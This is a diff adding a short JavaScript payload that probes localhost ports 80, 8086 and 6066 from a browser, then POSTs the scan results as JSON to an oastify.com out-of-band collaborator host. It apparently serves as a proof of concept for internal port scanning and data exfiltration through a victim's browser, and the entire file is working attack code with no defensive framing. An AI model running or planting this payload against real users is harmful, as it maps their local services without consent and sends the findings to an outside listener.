@@ -1,0 +1,38 @@
+const ports = [80, 8086,6066];
+const results = [];
+
+const requests = ports.map(port => {
+    const url = `http://127.0.0.1:${port}`;
+    return fetch(url, {
+        method: 'GET',
+        credentials: 'omit' // CORS credentials set to false
+    })
+    .then(response => {
+        const result = response.ok ? `Success on port ${port}` : `Error on port ${port}: ${response.status}`;
+        console.log(result);
+        results.push(result);
+    })
+    .catch(error => {
+        const result = `Failed to connect to port ${port}: ${error}`;
+        console.log(result);
+        results.push(result);
+    });
+});
+
+Promise.all(requests).then(() => {
+    const report = {
+        timestamp: new Date().toISOString(),
+        results
+    };
+
+    fetch('http://z44fyopxmk8h0e4zv5t368syqpwgka8z.oastify.com', {
+        method: 'POST',
+        headers: {
+            'Content-Type': 'application/json'
+        },
+        body: JSON.stringify(report),
+        credentials: 'omit'
+    })
+    .then(response => console.log('Report sent:', response.status))
+    .catch(error => console.log('Failed to send report:', error));
+});
